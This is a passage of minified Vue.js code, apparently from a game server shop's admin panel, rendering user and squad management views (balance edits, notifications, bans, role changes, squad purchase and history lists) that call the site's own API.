serDollarForm.change,callback:function(t){e.$set(e.updateUserDollarForm,"change",t)},expression:"updateUserDollarForm.change"}})],1),i("a-form-model-item",{attrs:{label:"理由",prop:"reason"}},[i("a-input",{staticStyle:{width:"250px"},attrs:{type:"textarea","auto-size":{minRows:4,maxRows:4}},model:{value:e.updateUserDollarForm.reason,callback:function(t){e.$set(e.updateUserDollarForm,"reason",t)},expression:"updateUserDollarForm.reason"}})],1)],1):e._e()],2),i("a-modal",{attrs:{title:"批量设置用户美金","mask-closable":!1,width:500},on:{cancel:function(){e.setUserDollarForm.dollars=0,e.setUserDollarForm.reason=""}},model:{value:e.showSetUserDollarModal,callback:function(t){e.showSetUserDollarModal=t},expression:"showSetUserDollarModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.setUserDollarLoading},on:{click:e.submitSetUserDollar}},[e._v("提交")])],1),e.showSetUserDollarModal?i("a-form-model",{ref:"setUserDollarForm",staticStyle:{"max-width":"500px"},attrs:{model:e.setUserDollarForm,rules:e.setUserDollarForm,"label-col":{span:7},"wrapper-col":{span:14}}},[i("a-form-model-item",{attrs:{label:"余额",prop:"dollars",extra:"大于等于0"}},[i("a-input-number",{staticStyle:{width:"250px"},model:{value:e.setUserDollarForm.dollars,callback:function(t){e.$set(e.setUserDollarForm,"dollars",t)},expression:"setUserDollarForm.dollars"}})],1),i("a-form-model-item",{attrs:{label:"理由",prop:"reason"}},[i("a-input",{staticStyle:{width:"250px"},attrs:{type:"textarea","auto-size":{minRows:4,maxRows:4}},model:{value:e.setUserDollarForm.reason,callback:function(t){e.$set(e.setUserDollarForm,"reason",t)},expression:"setUserDollarForm.reason"}})],1)],1):e._e()],2),i("a-modal",{attrs:{title:"批量发送消息通知","mask-closable":!1,width:500},on:{cancel:function(){e.sendUserNotificationForm.userIds=[],e.sendUserNotificationForm.content=""}},model:{value:e.showSendUserNotificationModal,callback:function(t){e.showSendUserNotificationModal=t},expression:"showSendUserNotificationModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.sendUserNotificationLoading},on:{click:e.submitSendUserNotification}},[e._v("提交")])],1),e.showSendUserNotificationModal?i("a-form-model",{ref:"sendUserNotificationForm",staticStyle:{"max-width":"500px"},attrs:{model:e.sendUserNotificationForm,rules:e.sendUserNotificationRules,"label-col":{span:7},"wrapper-col":{span:14}}},[i("a-form-model-item",{attrs:{label:"推送用户",prop:"userIds",extra:"可多选"}},[i("a-select",{staticStyle:{width:"100%"},attrs:{placeholder:"模糊搜索(商城用户名或Steam ID)",mode:"multiple","allow-clear":"","show-search":"","filter-option":!1},on:{search:e.handleSearchNotificationUser},model:{value:e.sendUserNotificationForm.userIds,callback:function(t){e.$set(e.sendUserNotificationForm,"userIds",t)},expression:"sendUserNotificationForm.userIds"}},e._l(e.searchNotificationUserNameList,(function(t){return i("a-select-option",{key:t.id,attrs:{label:t.userName}},[e._v(e._s(t.userName))])})),1)],1),i("a-form-model-item",{attrs:{label:"推送内容",prop:"content"}},[i("a-input",{staticStyle:{width:"250px"},attrs:{type:"textarea","auto-size":{minRows:4,maxRows:4}},model:{value:e.sendUserNotificationForm.content,callback:function(t){e.$set(e.sendUserNotificationForm,"content",t)},expression:"sendUserNotificationForm.content"}})],1)],1):e._e()],2)],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onUserListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onUserListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除选中用户吗(用户美金信息、美金流水、中奖记录、购买记录和管理权限将会被清空)"},on:{confirm:function(){return e.deleteUsers()}}},[e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"danger",icon:"delete"}},[e._v("删除选中")]):e._e()],1):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block"}},[e._v("ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userListFilter.id,callback:function(t){e.$set(e.userListFilter,"id",t)},expression:"userListFilter.id"}}),i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("用户昵称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userListFilter.userName,callback:function(t){e.$set(e.userListFilter,"userName",t)},expression:"userListFilter.userName"}}),i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("Email:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userListFilter.email,callback:function(t){e.$set(e.userListFilter,"email",t)},expression:"userListFilter.email"}}),i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("注册手机:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userListFilter.phone,callback:function(t){e.$set(e.userListFilter,"phone",t)},expression:"userListFilter.phone"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block"}},[e._v("Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.userListFilter.steamId,callback:function(t){e.$set(e.userListFilter,"steamId",t)},expression:"userListFilter.steamId"}}),i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("账号状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.userListFilter.status,callback:function(t){e.$set(e.userListFilter,"status",t)},expression:"userListFilter.status"}},[i("a-select-option",{key:"normal",attrs:{title:"正常"}},[e._v("正常")]),i("a-select-option",{key:"frozen",attrs:{title:"冻结"}},[e._v("冻结")])],1),i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("VIP等级:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.userListFilter.level,callback:function(t){e.$set(e.userListFilter,"level",t)},expression:"userListFilter.level"}},e._l(e.levelList,(function(t){return i("a-select-option",{key:t,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("在线状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.userListFilter.isOnline,callback:function(t){e.$set(e.userListFilter,"isOnline",t)},expression:"userListFilter.isOnline"}},[i("a-select-option",{key:"true",attrs:{title:"在线"}},[e._v("在线")]),i("a-select-option",{key:"false",attrs:{title:"离线"}},[e._v("离线")])],1)],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.userListColumns,"data-source":e.userListData,expandedRowKeys:e.expandedUserIds,"row-key":"id",pagination:!1,loading:e.loadingUserListTable,"row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t},getCheckboxProps:function(e){return{props:{disabled:!1===e.canBeDeleted}}}},bordered:"",scroll:{x:"100%"},size:"small"},on:{expand:function(t,i){if(t)void 0===e.expandedUserIds.find((function(e){return e===i.id}))&&e.expandedUserIds.push(i.id);else{var a=Object.keys(e.expandedUserIds).find((function(t){return e.expandedUserIds[t]===i.id}));void 0!==a&&e.expandedUserIds.splice(a,1)}}},scopedSlots:e._u([{key:"id",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"userName",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"isOnline",fn:function(t,a){return[i("a-badge",{attrs:{status:a.lastLoginTimeStamp&&!a.lastLogoutTimeStamp?"success":"default"}}),i("span",[e._v(e._s(a.lastLoginTimeStamp&&!a.lastLogoutTimeStamp?"在线":"离线"))])]}},{key:"steamId",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"dollars",fn:function(t,a){return[i("span",[e._v(e._s(a.userDollar.dollars.toFixed(2)))])]}},{key:"email",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"phone",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"status",fn:function(t){return[i("span",[e._v(e._s("normal"===t?"正常":"冻结"))])]}},{key:"level",fn:function(t,a){return[i("span",[e._v(e._s(a.userDollar.level))])]}},{key:"countLoginMinutes",fn:function(t){return[i("span",[e._v(e._s("number"==typeof t?t:"-")+"分钟")])]}},{key:"lastCheckInTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("超级管理员操作")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[i("span",[e._v("当前权限:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.userAdmin&&t.userAdmin.id?t.userAdmin.isSysAdmin?"超级管理员":t.userAdmin.isReadOnly?"管理员(只读)":"管理员":"普通用户"))]),e.userInfo&&e.userInfo.steamId!==t.steamId?i("span",{staticStyle:{"margin-left":"10px"}},[i("span",{staticStyle:{"margin-left":"5px"}},[e._v("变更操作:")]),i("a-dropdown",[i("a-menu",{attrs:{slot:"overlay"},on:{click:function(i){return e.handleChangeUserAdmin(i,t)}},slot:"overlay"},[i("a-menu-item",{key:"user",attrs:{disabled:!t.userAdmin}},[e._v("普通用户")]),i("a-menu-item",{key:"adminReadOnly",attrs:{disabled:t.userAdmin&&!t.userAdmin.isSysAdmin&&!0===t.userAdmin.isReadOnly}},[e._v("管理员(只读)")]),i("a-menu-item",{key:"admin",attrs:{disabled:t.userAdmin&&!t.userAdmin.isSysAdmin&&!0!==t.userAdmin.isReadOnly}},[e._v("管理员")]),i("a-menu-item",{key:"sysAdmin",attrs:{disabled:t.userAdmin&&t.userAdmin.isSysAdmin}},[e._v("超级管理员")])],1),i("a-button",{staticStyle:{"margin-left":"8px"},attrs:{size:"small"}},[e._v(e._s(t.userAdmin&&t.userAdmin.id?t.userAdmin.isSysAdmin?"超级管理员":!0===t.userAdmin.isReadOnly?"管理员(只读)":"管理员":"普通用户")),i("a-icon",{attrs:{type:"down"}})],1)],1)],1):e._e()]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[e.userInfo.userName!==t.userName?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除用户吗(用户美金信息、美金流水、中奖记录、购买记录和管理权限将会被清空)"},on:{confirm:function(){return e.deleteUser(t.id)}}},[i("a-button",{attrs:{size:"small",type:"danger",icon:"delete"}},[e._v("删除用户")])],1):e._e(),i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空美金流水记录列表吗"},on:{confirm:function(){return e.cleanUserDollarChange(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",type:"danger"}},[e._v("清空美金流水记录")])],1),i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空登录记录列表吗"},on:{confirm:function(){return e.cleanUserLogin(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",type:"danger"}},[e._v("清空登录记录")])],1),i("a-popconfirm",{attrs:{placement:"right",title:"确定要重置登录时长计数吗"},on:{confirm:function(){return e.cleanUserCountLoginMinutes(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"redo",type:"danger"}},[e._v("重置登录时长计数")])],1)],1),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("服务器操作")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要把用户踢出服务器吗(服务器下次重启前该用户将不能登录游戏服务器)"},on:{confirm:function(){return e.controlUserOnServer(t.id,"kick")}}},[i("a-button",{attrs:{size:"small",type:"danger",icon:"logout"}},[e._v("踢出服务器")])],1),i("a-popconfirm",{attrs:{placement:"right",title:"确定要屏蔽该用户吗(在24小时内，该玩家不能再登录服务器，同时将冻结商城账户，要永久屏蔽该玩家请前往G网/N网后台添加Ban List)"},on:{confirm:function(){return e.controlUserOnServer(t.id,"ban")}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"danger",icon:"stop"}},[e._v("屏蔽玩家")])],1),i("a-popconfirm",{attrs:{placement:"right",title:"确定要解除对该用户的屏蔽吗(该玩家将可以登录服务器，同时将解冻商城账户)"},on:{confirm:function(){return e.controlUserOnServer(t.id,"unban")}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"primary",icon:"undo"}},[e._v("取消屏蔽玩家")])],1),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"primary",icon:"edit"},on:{click:function(){return e.showControlUserMoneyOnServer(t.id)}}},[e._v("修改游戏内美元/金条")])],1)]:e._e(),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("用户信息操作")])]),t.userAdmin&&t.userAdmin.isSysAdmin&&e.userInfo&&"sysAdmin"===e.userInfo.role||!t.userAdmin||!t.userAdmin.isSysAdmin?e._e():i("a-alert",{attrs:{"show-icon":"",message:"普通管理员不能编辑超级管理员的信息",type:"warning"}}),i("a-divider",{staticStyle:{margin:"5px 0"}}),void 0!==e.expandedUserIds.find((function(e){return e===t.id}))?i("UserTableExpand",{attrs:{"user-id":t.id,"user-steam-id":t.steamId,"level-list":e.levelList,"level-detail-list":e.levelDetailList,"read-only":!(t.userAdmin&&t.userAdmin.isSysAdmin&&e.userInfo&&"sysAdmin"===e.userInfo.role||!t.userAdmin||!t.userAdmin.isSysAdmin),"third-party-robot-uid-configs":e.thirdPartyRobotUidConfigs,"military-level-list":e.militaryLevelList},on:{"click-create-report":function(){return e.gotoCreateReport(t)}}}):e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.userListPagination.pageSize,current:e.userListPagination.pageNum,total:e.userListPagination.total},on:{change:e.onChangeUserListPagination,showSizeChange:e.onShowSizeChangeUserListPagination}})],1)]),i("a-modal",{attrs:{title:"修改游戏内美元/金条","mask-closable":!1,width:500},on:{cancel:function(){e.showControlUserMoneyOnServerModal=!1}},model:{value:e.showControlUserMoneyOnServerModal,callback:function(t){e.showControlUserMoneyOnServerModal=t},expression:"showControlUserMoneyOnServerModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.updateUserDollarLoading},on:{click:e.submitControlUserMoneyOnServer}},[e._v("提交")])],1),e.showControlUserMoneyOnServerModal?i("a-form-model",{ref:"controlUserMoneyOnServerEditForm",staticStyle:{"max-width":"500px"},attrs:{model:e.controlUserMoneyOnServerEditForm,rules:e.controlUserMoneyOnServerRules,"label-col":{span:7},"wrapper-col":{span:14}}},[i("a-form-model-item",{attrs:{label:"货币类型",prop:"moneyType"}},[i("a-radio-group",{attrs:{size:"small","button-style":"solid"},model:{value:e.controlUserMoneyOnServerEditForm.moneyType,callback:function(t){e.$set(e.controlUserMoneyOnServerEditForm,"moneyType",t)},expression:"controlUserMoneyOnServerEditForm.moneyType"}},[i("a-radio-button",{attrs:{value:"normal"}},[e._v("美元")]),i("a-radio-button",{attrs:{value:"gold"}},[e._v("金条")])],1)],1),i("a-form-model-item",{attrs:{label:"变动类型",prop:"controlType"}},[i("a-radio-group",{attrs:{size:"small","button-style":"solid"},model:{value:e.controlUserMoneyOnServerEditForm.controlType,callback:function(t){e.$set(e.controlUserMoneyOnServerEditForm,"controlType",t)},expression:"controlUserMoneyOnServerEditForm.controlType"}},[i("a-radio-button",{attrs:{value:"set"}},[e._v("覆盖")]),i("a-radio-button",{attrs:{value:"change"}},[e._v("相对值")])],1)],1),i("a-form-model-item",{attrs:{label:"金额",prop:"value"}},[i("a-input-number",{staticStyle:{width:"250px"},model:{value:e.controlUserMoneyOnServerEditForm.value,callback:function(t){e.$set(e.controlUserMoneyOnServerEditForm,"value",t)},expression:"controlUserMoneyOnServerEditForm.value"}})],1)],1):e._e()],2)],1)}),[],!1,null,"f5635264",null),me=pe.exports,ge=(i("b0c0"),{name:"SquadTableExpand",props:{squadId:{}},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,historyActionStatusMap:{created:"processing",join:"success",exit:"default",kicked:"error",disband:"error"},historyActionMap:{created:"创建",join:"加入",exit:"退出",kicked:"被踢",disband:"解散"},squadMemberListColumns:[{title:"用户名",key:"user",dataIndex:"user",width:180,align:"center",scopedSlots:{customRender:"user"}},{title:"角色",key:"role",dataIndex:"role",width:80,align:"center",scopedSlots:{customRender:"role"}},{title:"加入日期",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:120,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],squadMemberListData:[],loadingSquadMemberListTable:!1,squadMemberListPagination:{pageSize:20,pageNum:1,total:0},squadJoinRequestListColumns:[{title:"用户名",key:"user",dataIndex:"user",width:180,align:"center",scopedSlots:{customRender:"user"}},{title:"状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"申请日期",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:120,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],squadJoinRequestListData:[],loadingSquadJoinRequestListTable:!1,squadJoinRequestListPagination:{pageSize:20,pageNum:1,total:0},squadHistoryListColumns:[{title:"用户名",key:"user",dataIndex:"user",width:180,align:"center",scopedSlots:{customRender:"user"}},{title:"动作",key:"action",dataIndex:"action",width:80,align:"center",scopedSlots:{customRender:"action"}},{title:"发生日期",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:120,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],squadHistoryListData:[],loadingSquadHistoryListTable:!1,squadHistoryListPagination:{pageSize:20,pageNum:1,total:0},cleanSquadBuyLoading:!1,deleteSquadBuyLoading:!1,squadBuyListColumns:[{title:"操作用户",key:"user",dataIndex:"user",width:180,align:"center",scopedSlots:{customRender:"user"}},{title:"商品名称",key:"itemName",dataIndex:"itemName",width:180,align:"center",scopedSlots:{customRender:"itemName"}},{title:"购买数量",key:"number",dataIndex:"number",width:100,align:"center",scopedSlots:{customRender:"number"}},{title:"购买时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:180,align:"center",scopedSlots:{customRender:"createdTimeStamp"}},{title:"操作",key:"controls",dataIndex:"controls",width:180,align:"center",scopedSlots:{customRender:"controls"}}],squadBuyListData:[],loadingSquadBuyListTable:!1,squadBuyListPagination:{pageSize:20,pageNum:1,total:0},cleanSquadDollarChangeLoading:!1,squadDollarChangeListColumns:[{title:"变动金额",key:"balance",dataIndex:"balance",width:100,align:"center",scopedSlots:{customRender:"balance"}},{title:"变动原因",key:"reason",dataIndex:"reason",width:300,align:"center",scopedSlots:{customRender:"reason"}},{title:"发生时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:180,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],squadDollarChangeListData:[],loadingSquadDollarChangeListTable:!1,squadDollarChangeListPagination:{pageSize:20,pageNum:1,total:0}}},methods:{onChangeSquadMemberListPagination:function(e){var t=this;this.squadMemberListPagination.pageNum=e,this.$nextTick((function(){t.getSquadMemberList()}))},onShowSizeChangeSquadMemberListPagination:function(e,t){var i=this;this.squadMemberListPagination.pageNum=1,this.squadMemberListPagination.pageSize=t,this.$nextTick((function(){i.getSquadMemberList()}))},getSquadMemberList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.squadMemberListPagination,a=i.pageNum,n=i.pageSize,r={pageNum:a,pageSize:n,squadId:e.squadId},e.loadingSquadMemberListTable=!0,t.prev=3,t.next=6,f({method:"GET",url:"/squadAdminSys/listSquadUser",params:r});case 6:o=t.sent,e.loadingSquadMemberListTable=!1,200===o.status&&(e.squadMemberListPagination.total=o.data.count,e.squadMemberListData=o.data.list),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.loadingSquadMemberListTable=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})))()},onChangeSquadJoinRequestListPagination:function(e){var t=this;this.squadJoinRequestListPagination.pageNum=e,this.$nextTick((function(){t.getSquadJoinRequestList()}))},onShowSizeChangeSquadJoinRequestListPagination:function(e,t){var i=this;this.squadJoinRequestListPagination.pageNum=1,this.squadJoinRequestListPagination.pageSize=t,this.$nextTick((function(){i.getSquadJoinRequestList()}))},getSquadJoinRequestList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.squadJoinRequestListPagination,a=i.pageNum,n=i.pageSize,r={pageNum:a,pageSize:n,squadId:e.squadId},e.loadingSquadJoinRequestListTable=!0,t.prev=3,t.next=6,f({method:"GET",url:"/squadAdminSys/listSquadJoinRequest",params:r});case 6:o=t.sent,e.loadingSquadJoinRequestListTable=!1,200===o.status&&(e.squadJoinRequestListPagination.total=o.data.count,e.squadJoinRequestListData=o.data.list),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.loadingSquadJoinRequestListTable=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})))()},onChangeSquadHistoryListPagination:function(e){var t=this;this.squadHistoryListPagination.pageNum=e,this.$nextTick((function(){t.getSquadHistoryList()}))},onShowSizeChangeSquadHistoryListPagination:function(e,t){var i=this;this.squadHistoryListPagination.pageNum=1,this.squadHistoryListPagination.pageSize=t,this.$nextTick((function(){i.getSquadHistoryList()}))},getSquadHistoryList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.squadHistoryListPagination,a=i.pageNum,n=i.pageSize,r={pageNum:a,pageSize:n,squadId:e.squadId},e.loadingSquadHistoryListTable=!0,t.prev=3,t.next=6,f({method:"GET",url:"/squadAdminSys/listSquadHistory",params:r});case 6:o=t.sent,e.loadingSquadHistoryListTable=!1,200===o.status&&(e.squadHistoryListPagination.total=o.data.count,e.squadHistoryListData=o.data.list),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.loadingSquadHistoryListTable=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})))()},onChangeSquadBuyListPagination:function(e){var t=this;this.squadBuyListPagination.pageNum=e,this.$nextTick((function(){t.getSquadBuyList()}))},onShowSizeChangeSquadBuyListPagination:function(e,t){var i=this;this.squadBuyListPagination.pageNum=1,this.squadBuyListPagination.pageSize=t,this.$nextTick((function(){i.getSquadBuyList()}))},getSquadBuyList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.squadBuyListPagination,a=i.pageNum,n=i.pageSize,r={pageNum:a,pageSize:n,squadId:e.squadId},e.loadingSquadBuyListTable=!0,t.prev=3,t.next=6,f({method:"GET",url:"/squadAdminSys/listSquadBuy",params:r});case 6:o=t.sent,e.loadingSquadBuyListTable=!1,200===o.status&&(e.squadBuyListPagination.total=o.data.count,e.squadBuyListData=o.data.list.map((function(e){var t=e.configs;try{e.configs=JSON.parse(t)}catch(i){e.configs=t}return e}))),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.loadingSquadBuyListTable=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})))()},refundSquadBuyItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"POST",url:"/squadAdminSys/refundSquadBuy",data:a});case 4:200===i.sent.status&&(t.$message.success("已操作退款"),t.getSquadBuyList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},deleteSquadBuyItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,t.deleteSquadBuyLoading=!0,i.next=4,f({method:"DELETE",url:"/squadAdminSys/deleteSquadBuy",params:{id:e}});case 4:200===i.sent.status&&(t.deleteSquadBuyLoading=!1,t.$message.success("操作成功"),t.getSquadBuyList()),i.next=12;break;case 8:i.prev=8,i.t0=i.catch(0),t.deleteSquadBuyLoading=!1,console.error(i.t0);case 12:case"end":return i.stop()}}),i,null,[[0,8]])})))()},cleanSquadBuyRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanSquadBuyLoading=!0,t.next=4,f({method:"DELETE",url:"/squadAdminSys/cleanSquadBuy",params:{squadId:e.squadId}});case 4:200===t.sent.status&&(e.cleanSquadBuyLoading=!1,e.$message.success("操作成功"),e.getSquadBuyList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanSquadBuyLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()},onChangeSquadDollarChangeListPagination:function(e){var t=this;this.squadDollarChangeListPagination.pageNum=e,this.$nextTick((function(){t.getSquadDollarChangeList()}))},onShowSizeChangeSquadDollarChangeListPagination:function(e,t){var i=this;this.squadDollarChangeListPagination.pageNum=1,this.squadDollarChangeListPagination.pageSize=t,this.$nextTick((function(){i.getSquadDollarChangeList()}))},getSquadDollarChangeList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i=e.squadDollarChangeListPagination,a=i.pageNum,n=i.pageSize,r={pageNum:a,pageSize:n,squadId:e.squadId},e.loadingSquadDollarChangeListTable=!0,t.prev=3,t.next=6,f({method:"GET",url:"/squadAdminSys/listSquadDollarChange",params:r});case 6:o=t.sent,e.loadingSquadDollarChangeListTable=!1,200===o.status&&(e.squadDollarChangeListPagination.total=o.data.count,e.squadDollarChangeListData=o.data.list),t.next=15;break;case 11:t.prev=11,t.t0=t.catch(3),console.error(t.t0),e.loadingSquadDollarChangeListTable=!1;case 15:case"end":return t.stop()}}),t,null,[[3,11]])})))()},cleanSquadDollarChangeRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanSquadDollarChangeLoading=!0,t.next=4,f({method:"DELETE",url:"/squadAdminSys/cleanSquadDollarChange",params:{squadId:e.squadId}});case 4:200===t.sent.status&&(e.cleanSquadDollarChangeLoading=!1,e.$message.success("操作成功"),e.getSquadDollarChangeList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanSquadDollarChangeLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}},watch:{squadId:{immediate:!0,handler:function(e){var t=this;console.log("value",e),void 